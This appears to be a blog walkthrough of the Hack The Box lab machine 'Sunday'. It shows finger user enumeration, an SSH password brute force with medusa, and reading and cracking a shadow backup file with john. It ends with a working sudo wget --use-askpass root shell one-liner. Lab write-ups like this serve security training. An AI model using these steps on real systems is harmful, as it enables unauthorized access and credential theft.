---
title: "HTB: Sunday"
date: 2023-12-23
draft: false
os: "Solaris"
difficulty: "Easy"
platform: "HTB"
aliases: ["/posts/htb/sunday/"]
tags:
  - htb
  - easy
  - solaris
  - finger
  - ssh-bruteforce
  - shadow-backup
  - wget-sudo
categories:
  - walkthrough
---

{{< box-info name="Sunday" os="Solaris" difficulty="Easy" ip="10.129.8.23" platform="HTB" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE VERSION
79/tcp    open  finger?
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
```
{{< /collapse >}}

Solaris box with an unusual port layout -- SSH on 22022 and the `finger` service on 79.

### Finger Enumeration

The `finger` service leaks valid usernames. Using Metasploit's `scanner/finger/finger_users`:

```bash
# Wordlist: /usr/share/seclists/Usernames/Names/names.txt
# Notable users found:
sammy, sunny, root
```

Confirming with manual finger queries:

```bash
finger sunny@10.129.8.23
# Login: sunny  TTY: ssh  Idle: <Apr 13, 2022> 10.10.14.13

finger sammy@10.129.8.23
# Login: sammy  TTY: ssh  Idle: <Apr 13, 2022> 10.10.14.13
```

Both `sammy` and `sunny` are active SSH users.

---

## Foothold

### SSH Brute Force

With two valid usernames and SSH on a non-standard port, brute force is worth a shot:

```bash
medusa -h 10.129.8.23 -u sunny -P /usr/share/wordlists/john.lst -M ssh -n 22022 -t 10 -f

ACCOUNT FOUND: [ssh] Host: 10.129.8.23 User: sunny Password: sunday [SUCCESS]
```

Credentials: `sunny:sunday` -- honestly, checking `sunday` as a password would've saved the brute force.

---

## Lateral Movement

### Shadow Backup → sammy

Checking sunny's bash history reveals breadcrumbs:

```bash
cat .bash_history
# ...
cat /backup/shadow.backup
sudo /root/troll
```

Following the trail:

```bash
cat /backup/shadow.backup

sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Crack sammy's hash:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

cooldude!        (sammy)
```

`su sammy` with `cooldude!` -- we're in.

---

## Privilege Escalation

### sudo wget --use-askpass

```bash
sudo -l
# User sammy may run the following commands on sunday:
#     (root) NOPASSWD: /usr/bin/wget
```

`wget` with sudo and no password is a clean GTFOBins escalation using `--use-askpass`:

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
sudo /usr/bin/wget --use-askpass=$TF 0
# whoami
root
```

---

## Proof

{{< terminal title="root@sunday" >}}
# whoami
root
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- The `finger` service is a goldmine for user enumeration on older systems -- always check it
- Backup shadow files with world-readable permissions are a common CTF (and real-world) finding
- Bash history often contains hints about where to look next -- check it early
- `sudo wget` with `--use-askpass` is an underrated GTFOBins technique for privilege escalation
{{< /callout >}}
